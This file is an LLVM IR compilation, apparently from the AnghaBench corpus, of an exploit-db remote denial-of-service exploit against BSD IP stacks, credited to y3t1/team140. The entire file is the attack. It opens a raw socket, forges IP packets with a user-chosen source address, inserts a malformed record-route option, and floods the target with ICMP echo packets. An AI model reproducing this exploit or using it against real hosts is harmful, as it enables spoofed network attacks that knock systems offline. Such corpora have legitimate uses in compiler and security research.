; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/bsd/dos/extr_19896.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/bsd/dos/extr_19896.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i32, i32 }
%struct.ipoption = type { i32* }

@.str = private unnamed_addr constant [47 x i8] c"  -= Remote denial-of-service in IP stack =- \0A\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.2 = private unnamed_addr constant [43 x i8] c"                          by y3t1/team140\0A\00", align 1
@.str.3 = private unnamed_addr constant [54 x i8] c"                             y3t1@rast.lodz.pdi.net \0A\00", align 1
@.str.4 = private unnamed_addr constant [39 x i8] c"%s -s src_addr -d dst_addr -p packets\0A\00", align 1
@.str.5 = private unnamed_addr constant [32 x i8] c" -s src_addr - source address \0A\00", align 1
@.str.6 = private unnamed_addr constant [30 x i8] c" -d dst_addr - dest address \0A\00", align 1
@.str.7 = private unnamed_addr constant [59 x i8] c" -p packets - how many packets send to dest (default 100)\0A\00", align 1
@opterr = common dso_local global i64 0, align 8
@.str.8 = private unnamed_addr constant [7 x i8] c"s:d:p:\00", align 1
@EOF = common dso_local global i8 0, align 1
@optarg = common dso_local global i32 0, align 4
@IP_MAXPACKET = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [7 x i8] c"malloc\00", align 1
@IPPROTO_RAW = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@LIBNET_ICMP_H = common dso_local global i32 0, align 4
@IPPROTO_ICMP = common dso_local global i32 0, align 4
@IPOPT_RR = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [7 x i8] c"Error\0A\00", align 1
@ICMP_ECHO = common dso_local global i32 0, align 4
@LIBNET_IP_H = common dso_local global i32 0, align 4
@LIBNET_ICMP_ECHO_H = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [20 x i8] c"can't do checksum \0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8, align 1
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.hostent*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32*, align 8
  %15 = alloca [4 x i32], align 16
  %16 = alloca i32, align 4
  %17 = alloca %struct.ipoption, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 16, i32* %16, align 4
  %18 = call i32 @time(i32* null)
  %19 = call i32 @srand(i32 %18)
  store i32 100, i32* %10, align 4
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str, i64 0, i64 0))
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.2, i64 0, i64 0))
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.3, i64 0, i64 0))
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  %25 = load i32, i32* %4, align 4
  %26 = icmp slt i32 %25, 4
  br i1 %26, label %27, label %36

27:                                               ; preds = %2
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 0
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.4, i64 0, i64 0), i8* %30)
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.5, i64 0, i64 0))
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.6, i64 0, i64 0))
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.7, i64 0, i64 0))
  %35 = call i32 @exit(i32 1) #3
  unreachable

36:                                               ; preds = %2
  store i64 0, i64* @opterr, align 8
  br label %37

37:                                               ; preds = %83, %36
  %38 = load i32, i32* %4, align 4
  %39 = load i8**, i8*** %5, align 8
  %40 = call signext i8 @getopt(i32 %38, i8** %39, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.8, i64 0, i64 0))
  store i8 %40, i8* %6, align 1
  %41 = sext i8 %40 to i32
  %42 = load i8, i8* @EOF, align 1
  %43 = sext i8 %42 to i32
  %44 = icmp ne i32 %41, %43
  br i1 %44, label %45, label %84

45:                                               ; preds = %37
  %46 = load i8, i8* %6, align 1
  %47 = sext i8 %46 to i32
  switch i32 %47, label %83 [
    i32 115, label %48
    i32 100, label %64
    i32 112, label %80
  ]

48:                                               ; preds = %45
  %49 = load i32, i32* @optarg, align 4
  %50 = call %struct.hostent* @gethostbyname(i32 %49)
  store %struct.hostent* %50, %struct.hostent** %11, align 8
  %51 = icmp ne %struct.hostent* %50, null
  br i1 %51, label %52, label %60

52:                                               ; preds = %48
  %53 = load %struct.hostent*, %struct.hostent** %11, align 8
  %54 = getelementptr inbounds %struct.hostent, %struct.hostent* %53, i32 0, i32 1
  %55 = load i32, i32* %54, align 4
  %56 = load %struct.hostent*, %struct.hostent** %11, align 8
  %57 = getelementptr inbounds %struct.hostent, %struct.hostent* %56, i32 0, i32 0
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @bcopy(i32 %55, i32* %12, i32 %58)
  br label %63

60:                                               ; preds = %48
  %61 = load i32, i32* @optarg, align 4
  %62 = call i32 @inet_addr(i32 %61)
  store i32 %62, i32* %12, align 4
  br label %63

63:                                               ; preds = %60, %52
  br label %83

64:                                               ; preds = %45
  %65 = load i32, i32* @optarg, align 4
  %66 = call %struct.hostent* @gethostbyname(i32 %65)
  store %struct.hostent* %66, %struct.hostent** %11, align 8
  %67 = icmp ne %struct.hostent* %66, null
  br i1 %67, label %68, label %76

68:                                               ; preds = %64
  %69 = load %struct.hostent*, %struct.hostent** %11, align 8
  %70 = getelementptr inbounds %struct.hostent, %struct.hostent* %69, i32 0, i32 1
  %71 = load i32, i32* %70, align 4
  %72 = load %struct.hostent*, %struct.hostent** %11, align 8
  %73 = getelementptr inbounds %struct.hostent, %struct.hostent* %72, i32 0, i32 0
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @bcopy(i32 %71, i32* %13, i32 %74)
  br label %79

76:                                               ; preds = %64
  %77 = load i32, i32* @optarg, align 4
  %78 = call i32 @inet_addr(i32 %77)
  store i32 %78, i32* %13, align 4
  br label %79

79:                                               ; preds = %76, %68
  br label %83

80:                                               ; preds = %45
  %81 = load i32, i32* @optarg, align 4
  %82 = call i32 @atoi(i32 %81)
  store i32 %82, i32* %10, align 4
  br label %83

83:                                               ; preds = %45, %80, %79, %63
  br label %37

84:                                               ; preds = %37
  %85 = getelementptr inbounds [4 x i32], [4 x i32]* %15, i64 0, i64 0
  %86 = load i32, i32* %16, align 4
  %87 = call i32 @bzero(i32* %85, i32 %86)
  %88 = load i32, i32* @IP_MAXPACKET, align 4
  %89 = call i32* @malloc(i32 %88)
  store i32* %89, i32** %14, align 8
  %90 = load i32*, i32** %14, align 8
  %91 = icmp ne i32* %90, null
  br i1 %91, label %95, label %92

92:                                               ; preds = %84
  %93 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.9, i64 0, i64 0))
  %94 = call i32 @exit(i32 -1) #3
  unreachable

95:                                               ; preds = %84
  %96 = load i32, i32* @IPPROTO_RAW, align 4
  %97 = call i32 @libnet_open_raw_sock(i32 %96)
  store i32 %97, i32* %7, align 4
  %98 = load i32, i32* %7, align 4
  %99 = icmp eq i32 %98, -1
  br i1 %99, label %100, label %103

100:                                              ; preds = %95
  %101 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i64 0, i64 0))
  %102 = call i32 @exit(i32 -1) #3
  unreachable

103:                                              ; preds = %95
  %104 = load i32, i32* @LIBNET_ICMP_H, align 4
  %105 = load i32, i32* @IPPROTO_ICMP, align 4
  %106 = load i32, i32* %12, align 4
  %107 = load i32, i32* %13, align 4
  %108 = load i32*, i32** %14, align 8
  %109 = call i32 @libnet_build_ip(i32 %104, i32 0, i32 242, i32 0, i32 48, i32 %105, i32 %106, i32 %107, i32* null, i32 0, i32* %108)
  %110 = getelementptr inbounds %struct.ipoption, %struct.ipoption* %17, i32 0, i32 0
  %111 = load i32*, i32** %110, align 8
  %112 = getelementptr inbounds [4 x i32], [4 x i32]* %15, i64 0, i64 0
  %113 = load i32, i32* %16, align 4
  %114 = call i32 @memcpy(i32* %111, i32* %112, i32 %113)
  %115 = load i32, i32* @IPOPT_RR, align 4
  %116 = getelementptr inbounds %struct.ipoption, %struct.ipoption* %17, i32 0, i32 0
  %117 = load i32*, i32** %116, align 8
  store i32 %115, i32* %117, align 4
  %118 = getelementptr inbounds %struct.ipoption, %struct.ipoption* %17, i32 0, i32 0
  %119 = load i32*, i32** %118, align 8
  %120 = getelementptr inbounds i32, i32* %119, i64 1
  store i32 3, i32* %120, align 4
  %121 = getelementptr inbounds %struct.ipoption, %struct.ipoption* %17, i32 0, i32 0
  %122 = load i32*, i32** %121, align 8
  %123 = getelementptr inbounds i32, i32* %122, i64 2
  store i32 255, i32* %123, align 4
  %124 = getelementptr inbounds %struct.ipoption, %struct.ipoption* %17, i32 0, i32 0
  %125 = load i32*, i32** %124, align 8
  %126 = getelementptr inbounds i32, i32* %125, i64 3
  store i32 0, i32* %126, align 4
  %127 = load i32, i32* %16, align 4
  %128 = load i32*, i32** %14, align 8
  %129 = call i32 @libnet_insert_ipo(%struct.ipoption* %17, i32 %127, i32* %128)
  store i32 %129, i32* %8, align 4
  %130 = load i32, i32* %8, align 4
  %131 = icmp eq i32 %130, -1
  br i1 %131, label %132, label %135

132:                                              ; preds = %103
  %133 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.11, i64 0, i64 0))
  %134 = call i32 @exit(i32 1) #3
  unreachable

135:                                              ; preds = %103
  %136 = load i32, i32* @ICMP_ECHO, align 4
  %137 = load i32*, i32** %14, align 8
  %138 = load i32, i32* @LIBNET_IP_H, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds i32, i32* %137, i64 %139
  %141 = load i32, i32* %16, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds i32, i32* %140, i64 %142
  %144 = call i32 @libnet_build_icmp_echo(i32 %136, i32 0, i32 242, i32 31337, i32* null, i32 0, i32* %143)
  %145 = load i32*, i32** %14, align 8
  %146 = load i32, i32* @IPPROTO_ICMP, align 4
  %147 = load i32, i32* @LIBNET_ICMP_ECHO_H, align 4
  %148 = call i32 @libnet_do_checksum(i32* %145, i32 %146, i32 %147)
  %149 = icmp eq i32 %148, -1
  br i1 %149, label %150, label %152

150:                                              ; preds = %135
  %151 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.12, i64 0, i64 0))
  br label %152

152:                                              ; preds = %150, %135
  store i32 0, i32* %9, align 4
  br label %153

153:                                              ; preds = %169, %152
  %154 = load i32, i32* %9, align 4
  %155 = load i32, i32* %10, align 4
  %156 = icmp slt i32 %154, %155
  br i1 %156, label %157, label %172

157:                                              ; preds = %153
  %158 = call i32 @rand_n(i32 255)
  %159 = load i32*, i32** %14, align 8
  %160 = getelementptr inbounds i32, i32* %159, i64 22
  store i32 %158, i32* %160, align 4
  %161 = load i32, i32* %7, align 4
  %162 = load i32*, i32** %14, align 8
  %163 = load i32, i32* @LIBNET_ICMP_ECHO_H, align 4
  %164 = load i32, i32* @LIBNET_IP_H, align 4
  %165 = add nsw i32 %163, %164
  %166 = load i32, i32* %16, align 4
  %167 = add nsw i32 %165, %166
  %168 = call i32 @libnet_write_ip(i32 %161, i32* %162, i32 %167)
  store i32 %168, i32* %8, align 4
  br label %169

169:                                              ; preds = %157
  %170 = load i32, i32* %9, align 4
  %171 = add nsw i32 %170, 1
  store i32 %171, i32* %9, align 4
  br label %153

172:                                              ; preds = %153
  %173 = load i32*, i32** %14, align 8
  %174 = call i32 @free(i32* %173)
  %175 = load i32, i32* %7, align 4
  %176 = call i32 @libnet_close_raw_sock(i32 %175)
  %177 = load i32, i32* %3, align 4
  ret i32 %177
}

declare dso_local i32 @srand(i32) #1

declare dso_local i32 @time(i32*) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local signext i8 @getopt(i32, i8**, i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i32) #1

declare dso_local i32 @bcopy(i32, i32*, i32) #1

declare dso_local i32 @inet_addr(i32) #1

declare dso_local i32 @atoi(i32) #1

declare dso_local i32 @bzero(i32*, i32) #1

declare dso_local i32* @malloc(i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @libnet_open_raw_sock(i32) #1

declare dso_local i32 @libnet_build_ip(i32, i32, i32, i32, i32, i32, i32, i32, i32*, i32, i32*) #1

declare dso_local i32 @memcpy(i32*, i32*, i32) #1

declare dso_local i32 @libnet_insert_ipo(%struct.ipoption*, i32, i32*) #1

declare dso_local i32 @libnet_build_icmp_echo(i32, i32, i32, i32, i32*, i32, i32*) #1

declare dso_local i32 @libnet_do_checksum(i32*, i32, i32) #1

declare dso_local i32 @rand_n(i32) #1

declare dso_local i32 @libnet_write_ip(i32, i32*, i32) #1

declare dso_local i32 @free(i32*) #1

declare dso_local i32 @libnet_close_raw_sock(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
